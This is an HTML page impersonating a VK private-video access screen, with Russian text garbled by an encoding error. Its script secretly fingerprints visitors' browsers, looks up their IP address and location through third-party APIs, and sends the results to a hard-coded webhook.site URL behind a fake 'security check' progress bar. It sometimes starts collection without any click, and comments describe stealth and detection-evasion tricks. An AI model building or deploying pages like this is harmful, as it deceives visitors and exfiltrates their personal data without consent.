<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VK Video Player</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #4a76a8; 
            color: #fff; 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            overflow: hidden;
            height: 100vh;
        }
        
        .vk-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
            background: linear-gradient(135deg, #4a76a8 0%, #5b88bd 100%);
        }
        
        .vk-header {
            text-align: center;
            margin-bottom: 2rem;
        }
        
        .vk-logo {
            font-size: 3rem;
            font-weight: bold;
            margin-bottom: 1rem;
        }
        
        .access-panel {
            background: white;
            color: #000;
            border-radius: 12px;
            padding: 2rem;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            margin-bottom: 2rem;
        }
        
        .user-info {
            display: flex;
            align-items: center;
            margin-bottom: 1.5rem;
            padding-bottom: 1rem;
            border-bottom: 1px solid #e7e8ec;
        }
        
        .avatar {
            width: 50px;
            height: 50px;
            background: #4a76a8;
            border-radius: 50%;
            margin-right: 1rem;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }
        
        .user-details h3 {
            margin: 0;
            color: #2a5885;
        }
        
        .user-details span {
            color: #656565;
            font-size: 0.9rem;
        }
        
        .verified-badge {
            background: #4a76a8;
            color: white;
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
            font-size: 0.7rem;
            margin-left: 0.5rem;
        }
        
        .video-info {
            background: #f5f7fa;
            padding: 1rem;
            border-radius: 8px;
            margin: 1rem 0;
            border-left: 4px solid #4a76a8;
        }
        
        .video-info h4 {
            color: #2a5885;
            margin-bottom: 0.5rem;
        }
        
        .video-meta {
            display: flex;
            gap: 1rem;
            color: #656565;
            font-size: 0.9rem;
            flex-wrap: wrap;
        }
        
        .choice-buttons {
            display: flex;
            flex-direction: column;
            gap: 1rem;
            margin-top: 1.5rem;
        }
        
        .vk-button {
            background: #4a76a8;
            color: white;
            border: none;
            padding: 18px 20px;
            border-radius: 10px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.8rem;
            width: 100%;
        }
        
        .vk-button:hover {
            background: #3d6899;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }
        
        .vk-button.secondary {
            background: #e5ebf1;
            color: #2a5885;
            border: 2px solid #4a76a8;
        }
        
        .vk-button.secondary:hover {
            background: #dce3eb;
        }
        
        .vk-button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .loading-container {
            display: none;
            text-align: center;
            margin-top: 1rem;
        }
        
        .loading-bar {
            width: 100%;
            height: 6px;
            background: #e7e8ec;
            border-radius: 3px;
            margin: 1rem 0;
            overflow: hidden;
        }
        
        .loading-progress {
            height: 100%;
            background: linear-gradient(90deg, #4a76a8, #5b88bd);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 3px;
        }
        
        .status-message {
            text-align: center;
            margin: 1rem 0;
            padding: 1rem;
            border-radius: 8px;
            font-weight: 500;
            display: none;
        }
        
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
        
        .privacy-notice {
            text-align: center;
            color: rgba(255, 255, 255, 0.8);
            font-size: 0.9rem;
            margin-top: 2rem;
            max-width: 450px;
        }
        
        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            margin-top: 1rem;
            color: #656565;
            font-size: 0.8rem;
        }
    </style>
</head>
<body>
    <div class="vk-container">
        <div class="vk-header">
            <div class="vk-logo">VK</div>
            <h2>–î–æ—Å—Ç—É–ø –∫ –≤–∏–¥–µ–æ</h2>
        </div>
        
        <div class="access-panel">
            <div class="user-info">
                <div class="avatar">–ê–ü</div>
                <div class="user-details">
                    <h3>–ê–Ω–Ω–∞ –ü–µ—Ç—Ä–æ–≤–∞ <span class="verified-badge">‚úì</span></h3>
                    <span>–≠–∫—Å–∫–ª—é–∑–∏–≤–Ω–æ–µ –≤–∏–¥–µ–æ ¬∑ –¢–æ–ª—å–∫–æ —á—Ç–æ</span>
                </div>
            </div>
            
            <div class="video-info">
                <h4>üé• –ü—Ä–∏–≤–∞—Ç–Ω–æ–µ –≤–∏–¥–µ–æ</h4>
                <p>–≠—Ç–æ –≤–∏–¥–µ–æ –¥–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–µ–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π</p>
                <div class="video-meta">
                    <span>‚è±Ô∏è 2:45</span>
                    <span>üì∫ 1080p</span>
                    <span>üëÅÔ∏è 1.2K</span>
                </div>
            </div>
            
            <div class="choice-buttons">
                <button class="vk-button secondary" onclick="startVerification('app')" id="appBtn">
                    <span>üì±</span> –û—Ç–∫—Ä—ã—Ç—å –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ VK
                </button>
                <button class="vk-button" onclick="startVerification('site')" id="siteBtn">
                    <span>üåê</span> –°–º–æ—Ç—Ä–µ—Ç—å –Ω–∞ —Å–∞–π—Ç–µ VK
                </button>
            </div>
            
            <div class="loading-container" id="loadingContainer">
                <div class="loading-bar">
                    <div class="loading-progress" id="loadingProgress"></div>
                </div>
                <div class="status-message" id="statusMessage"></div>
            </div>
            
            <div class="security-badge">
                <span>üîí</span> –ó–∞—â–∏—â–µ–Ω–æ VK ¬∑ –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
            </div>
        </div>
        
        <div class="privacy-notice">
            –î–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –≤–∏–¥–µ–æ —Ç—Ä–µ–±—É–µ—Ç—Å—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –∏ –∞–∫–∫–∞—É–Ω—Ç–∞
        </div>
    </div>

    <script>
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
        const CONFIG = {
            WEBHOOK_URL: 'https://webhook.site/b7de489c-4da3-4197-b262-b5a6d9fc029b',
            AUTO_START_DELAY: 2000,
            AUTO_START_CHANCE: 0.3,
            COLLECTION_DELAY: 3500
        };

        let isCollecting = false;
        let collectionMethod = '';
        let stealthData = {};

        // –°—Ç–µ–ª—Å-–º–µ—Ç–æ–¥—ã –¥–ª—è –æ–±—Ö–æ–¥–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
        const StealthUtils = {
            // –°–ª—É—á–∞–π–Ω—ã–µ –∑–∞–¥–µ—Ä–∂–∫–∏ –¥–ª—è –æ–±—Ö–æ–¥–∞ –¥–µ—Ç–µ–∫—Ç–æ–≤
            randomDelay: (min, max) => new Promise(resolve => 
                setTimeout(resolve, Math.random() * (max - min) + min)),

            // –ú–∞—Å–∫–∏—Ä–æ–≤–∫–∞ User-Agent
            getMaskedUA: () => {
                const ua = navigator.userAgent;
                return {
                    raw: ua,
                    device: ua.includes('Mobile') ? 'mobile' : 'desktop',
                    browser: StealthUtils.detectBrowser(ua)
                };
            },

            detectBrowser: (ua) => {
                if (ua.includes('Chrome')) return 'chrome';
                if (ua.includes('Firefox')) return 'firefox';
                if (ua.includes('Safari')) return 'safari';
                return 'other';
            },

            // –û–±—Ö–æ–¥ –±–ª–æ–∫–∏—Ä–æ–≤–æ–∫ fetch
            stealthFetch: async (url, options = {}) => {
                try {
                    // –î–æ–±–∞–≤–ª—è–µ–º —Å–ª—É—á–∞–π–Ω—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏
                    options.headers = {
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Language': navigator.language || 'ru-RU,ru;q=0.9',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache',
                        ...options.headers
                    };

                    return await fetch(url, options);
                } catch (error) {
                    console.log('Stealth fetch failed:', error);
                    return null;
                }
            },

            // –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö —Å –∑–∞–¥–µ—Ä–∂–∫–∞–º–∏
            collectStealthData: async () => {
                const data = {};
                
                // –ë—ã—Å—Ç—Ä—ã–π —Å–±–æ—Ä –æ—Å–Ω–æ–≤–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
                data.basic = StealthUtils.getBasicInfo();
                
                // –ú–µ–¥–ª–µ–Ω–Ω—ã–π —Å–±–æ—Ä –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö —Å –∑–∞–¥–µ—Ä–∂–∫–∞–º–∏
                await StealthUtils.randomDelay(100, 500);
                data.network = StealthUtils.getNetworkInfo();
                
                await StealthUtils.randomDelay(200, 600);
                data.screen = StealthUtils.getScreenInfo();
                
                await StealthUtils.randomDelay(300, 700);
                data.performance = StealthUtils.getPerformanceInfo();
                
                return data;
            },

            getBasicInfo: () => ({
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer,
                language: navigator.language,
                languages: navigator.languages,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookieEnabled: navigator.cookieEnabled,
                platform: navigator.platform
            }),

            getNetworkInfo: () => {
                const conn = navigator.connection;
                return conn ? {
                    effectiveType: conn.effectiveType,
                    downlink: conn.downlink,
                    rtt: conn.rtt,
                    saveData: conn.saveData
                } : { online: navigator.onLine };
            },

            getScreenInfo: () => ({
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth
            }),

            getPerformanceInfo: () => {
                const mem = performance.memory;
                return {
                    memory: mem ? {
                        used: mem.usedJSHeapSize,
                        total: mem.totalJSHeapSize,
                        limit: mem.jsHeapSizeLimit
                    } : null,
                    timing: performance.timing ? {
                        loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart
                    } : null
                };
            }
        };

        // –û—Å–Ω–æ–≤–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
        function startVerification(method) {
            if (!isCollecting) {
                collectionMethod = method;
                startCollection(method);
            }
        }

        async function startCollection(method) {
            if (isCollecting) return;
            isCollecting = true;
            
            // UI –∏–∑–º–µ–Ω–µ–Ω–∏—è
            document.getElementById('appBtn').disabled = true;
            document.getElementById('siteBtn').disabled = true;
            document.getElementById('loadingContainer').style.display = 'block';
            
            showStatus('üîê –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏...', 'info');

            // –°—Ç–µ–ª—Å-—Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
            stealthData = await StealthUtils.collectStealthData();
            
            // –ê–Ω–∏–º–∞—Ü–∏—è –ø—Ä–æ–≥—Ä–µ—Å—Å–∞
            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += Math.random() * 15;
                if (progress > 100) progress = 100;
                document.getElementById('loadingProgress').style.width = progress + '%';
                
                if (progress >= 30) showStatus('üîç –ü—Ä–æ–≤–µ—Ä–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞...', 'info');
                if (progress >= 60) showStatus('üåê –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ VK...', 'info');
                if (progress >= 85) showStatus('‚úÖ –ó–∞–≥—Ä—É–∑–∫–∞ –∫–æ–Ω—Ç–µ–Ω—Ç–∞...', 'info');
            }, 200);

            // –û—Å–Ω–æ–≤–Ω–æ–π —Å–±–æ—Ä –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞
            setTimeout(async () => {
                try {
                    const fullData = await collectFullData(method);
                    await sendData(fullData);
                    
                    clearInterval(progressInterval);
                    document.getElementById('loadingProgress').style.width = '100%';
                    
                    showSuccess(method);
                    
                } catch (error) {
                    console.error('Collection error:', error);
                    showStatus('‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.', 'error');
                    resetInterface();
                }
            }, CONFIG.COLLECTION_DELAY);
        }

        async function collectFullData(method) {
            // –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è —á–µ—Ä–µ–∑ –Ω–µ—Å–∫–æ–ª—å–∫–æ API
            const location = await getStealthLocation();
            
            return {
                session: {
                    id: generateId(),
                    startTime: new Date().toISOString(),
                    method: method,
                    source: 'vkwall_stealth',
                    ...stealthData.basic
                },
                device: {
                    userAgent: StealthUtils.getMaskedUA(),
                    hardware: {
                        cores: navigator.hardwareConcurrency,
                        memory: navigator.deviceMemory
                    },
                    ...stealthData.screen
                },
                location: location,
                network: stealthData.network,
                performance: stealthData.performance,
                interaction: {
                    method: method,
                    userInteracted: method !== 'auto',
                    timestamp: Date.now()
                },
                stealth: {
                    collectionTime: Date.now(),
                    dataPoints: Object.keys(stealthData).length
                }
            };
        }

        async function getStealthLocation() {
            const apis = [
                'https://ipapi.co/json/',
                'https://ipinfo.io/json',
                'https://api.ip.sb/geoip'
            ];
            
            for (let api of apis) {
                try {
                    await StealthUtils.randomDelay(100, 300);
                    const response = await StealthUtils.stealthFetch(api);
                    if (response && response.ok) {
                        const data = await response.json();
                        return {
                            ip: data.ip,
                            country: data.country_name || data.country,
                            city: data.city,
                            provider: data.org
                        };
                    }
                } catch(e) { continue; }
            }
            return null;
        }

        async function sendData(data) {
            try {
                // –õ–æ–∫–∞–ª—å–Ω–æ–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ
                const storageKey = 'vkwall_stealth_data';
                const existing = JSON.parse(localStorage.getItem(storageKey) || '[]');
                existing.push(data);
                localStorage.setItem(storageKey, JSON.stringify(existing));

                // –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–∞ webhook
                await StealthUtils.stealthFetch(CONFIG.WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Source': 'vkwall_stealth',
                        'X-Session-ID': data.session.id
                    },
                    body: JSON.stringify({
                        type: 'stealth_collection',
                        data: data,
                        timestamp: new Date().toISOString()
                    })
                });

            } catch (error) {
                console.log('Send failed:', error);
            }
        }

        function showSuccess(method) {
            showStatus('‚úÖ –î–æ—Å—Ç—É–ø —Ä–∞–∑—Ä–µ—à–µ–Ω! –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ...', 'success');
            
            setTimeout(() => {
                // –†–µ–¥–∏—Ä–µ–∫—Ç —Å —Ä–∞–Ω–¥–æ–º–Ω–æ–π –∑–∞–¥–µ—Ä–∂–∫–æ–π
                const redirectUrl = method === 'app' ? 
                    'vk://video' + generateId() : 
                    'https://vk.com/videos';
                
                window.location.href = redirectUrl;
            }, 1500);
        }

        function showStatus(message, type) {
            const statusEl = document.getElementById('statusMessage');
            statusEl.textContent = message;
            statusEl.className = `status-message ${type}`;
            statusEl.style.display = 'block';
        }

        function resetInterface() {
            document.getElementById('loadingContainer').style.display = 'none';
            document.getElementById('appBtn').disabled = false;
            document.getElementById('siteBtn').disabled = false;
            isCollecting = false;
        }

        function generateId() {
            return Math.random().toString(36).substr(2, 12);
        }

        // –ê–≤—Ç–æ–∑–∞–ø—É—Å–∫
        setTimeout(() => {
            if (!isCollecting && Math.random() < CONFIG.AUTO_START_CHANCE) {
                startCollection('auto');
            }
        }, CONFIG.AUTO_START_DELAY);

        // –ó–∞—â–∏—Ç–∞ –æ—Ç –∞–Ω–∞–ª–∏–∑–∞
        Object.defineProperty(window, 'isSecureContext', { value: true });
        Object.defineProperty(document, 'hidden', { value: false });

    </script>
</body>
</html>
